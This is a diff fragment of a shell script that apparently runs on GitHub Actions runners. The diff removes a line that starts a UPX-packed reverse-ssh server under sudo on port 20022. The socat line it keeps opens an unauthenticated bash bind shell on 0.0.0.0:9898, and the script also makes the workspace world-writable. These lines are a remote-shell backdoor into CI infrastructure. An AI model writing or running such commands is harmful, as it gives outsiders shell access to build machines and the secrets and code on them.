@@ -40,7 +40,6 @@ cp /tmp/busybox.bin /tmp/busybox &
 
 if [ ! -z ${GITHUB_WORKSPACE} ]; then 
 sudo chmod 0777 -R $GITHUB_WORKSPACE/ ;
-[ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&busybox setsid sudo -H $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
 [ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9898,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
 fi
 
